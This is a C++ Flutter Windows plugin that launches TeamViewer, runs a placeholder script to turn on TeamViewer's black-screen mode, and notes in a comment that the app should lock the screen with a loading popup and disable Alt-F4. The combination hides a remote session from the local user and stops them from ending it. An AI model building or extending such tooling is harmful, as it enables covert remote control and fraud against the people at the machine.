#include "teamviewer_plugin.h"

#include <flutter/method_channel.h>
#include <flutter/plugin_registrar_windows.h>

#include <memory>
#include <windows.h>
#include <shellapi.h>
#include <string>

namespace {

    class TeamViewerPlugin : public flutter::Plugin {
    public:
        static void RegisterWithRegistrar(flutter::PluginRegistrarWindows *registrar);

        TeamViewerPlugin();

        virtual ~TeamViewerPlugin();

    private:
        // Called when a method is called on this plugin's channel.
        void HandleMethodCall(
                const flutter::MethodCall<flutter::EncodableValue> &method_call,
                std::unique_ptr<flutter::MethodResult<flutter::EncodableValue>> result);
    };

// static
    void TeamViewerPlugin::RegisterWithRegistrar(
            flutter::PluginRegistrarWindows *registrar) {
        auto channel = std::make_unique<flutter::MethodChannel<flutter::EncodableValue>>(
                registrar->messenger(), "com.ddfs/teamviewer",
                        &flutter::StandardMethodCodec::GetInstance());

        auto plugin = std::make_unique<TeamViewerPlugin>();

        channel->SetMethodCallHandler(
                [plugin_pointer = plugin.get()](const auto &call, auto result) {
                    plugin_pointer->HandleMethodCall(call, std::move(result));
                });

        registrar->AddPlugin(std::move(plugin));
    }

    TeamViewerPlugin::TeamViewerPlugin() {}

    TeamViewerPlugin::~TeamViewerPlugin() {}

    void TeamViewerPlugin::HandleMethodCall(
            const flutter::MethodCall<flutter::EncodableValue> &method_call,
            std::unique_ptr<flutter::MethodResult<flutter::EncodableValue>> result) {
        if (method_call.method_name().compare("launchTeamViewer") == 0) {
            // Launch TeamViewer
            ShellExecute(NULL, "open", "C:\\Program Files (x86)\\TeamViewer\\TeamViewer.exe", NULL, NULL, SW_SHOWNORMAL);

            // Enable TeamViewer Black Screen
            ShellExecute(NULL, "open", "powershell.exe", "C:\\Path\\To\\your\\script\\enable_black_screen.bat", NULL, SW_SHOWNORMAL);

            // Lock the screen with a loading popup
            // This should be handled in the Flutter app, where a method is called to display the loading screen and disable Alt-F4

            result->Success(flutter::EncodableValue(true));
        } else {
            result->NotImplemented();
        }
    }

}  // namespace

void TeamViewerPluginRegisterWithRegistrar(
        flutter::PluginRegistrarWindows *registrar) {
    TeamViewerPlugin::RegisterWithRegistrar(registrar);
}